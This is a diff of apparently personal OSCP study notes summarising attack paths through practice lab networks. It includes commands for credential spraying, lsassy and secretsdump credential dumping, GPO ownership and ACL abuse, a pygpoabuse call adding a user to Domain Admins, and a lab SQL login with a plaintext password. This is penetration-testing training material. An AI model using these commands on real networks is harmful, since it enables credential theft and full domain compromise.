@@ -2,13 +2,21 @@
 #### OSCP A => Ligolo + cred hunting 
 1. Kerberoasting, mssql, smb were all red herrings. Always try spraying creds on **every** machine first! 
 
+#### OSCP B => Ligolo, mssql 
+1. M1 - might not have needed local admin? Set up ligolo, do ldapdomaindump, bloodhound, kerberoasting. 
+2. M2 - `impacket-mssqlclient {{DOMAIN}}/sql_svc:Dolphin1@{{MACHINE_IP}} -windows-auth` 
+3. M2 - Use mssql shell to potato, then download hives, check C:\Windows.old download more hives and spray creds. 
+
+#### OSCP C => ??? 
+1. ??? 
+
 #### Secura => Lsassy, MySQL, WriteOwner + GPLink 
 1. On M1 user is admin, run `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy` 
 2. On M2 `mysqldump.exe -u root --all-databases > dump.sql`, bloodhound shows GPO abuse 
 3. On M2 `$Pass = ConvertTo-SecureString '{{PASSWORD}}' -AsPlainText -Force` then `$Cred = New-Object System.Management.Automation.PSCredential('secura.yzx\charlotte', $Pass)` then `Import-Module .\PowerView.ps1` 
-4. On M2 `Get-DomainGPO -Domain secura.yzx -Server 192.168.92.97 -Credential $Cred -Identity 'Default Domain Policy' | Select-Object name, displayname` 
-5. On M2 `Set-DomainObjectOwner -Identity "31B2F340-016D-11D2-945F-00C04FB984F9" -OwnerIdentity charlotte -Server 192.168.92.97 -Credential $Cred` 
-6. On M2 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All -Server 192.168.92.97 -Credential $Cred` 
+4. On M2 `Get-DomainGPO -Domain secura.yzx -Server {{DC_IP}} -Credential $Cred -Identity 'Default Domain Policy' | Select-Object name, displayname` 
+5. On M2 `Set-DomainObjectOwner -Identity "31B2F340-016D-11D2-945F-00C04FB984F9" -OwnerIdentity charlotte -Server {{DC_IP}} -Credential $Cred` 
+6. On M2 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All -Server {{DC_IP}} -Credential $Cred` 
 7. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip {{DC_IP}} -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:{{PASSWORD}}'` 
 8. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:{{PASSWORD}}@{{DC_IP}}'` 
 
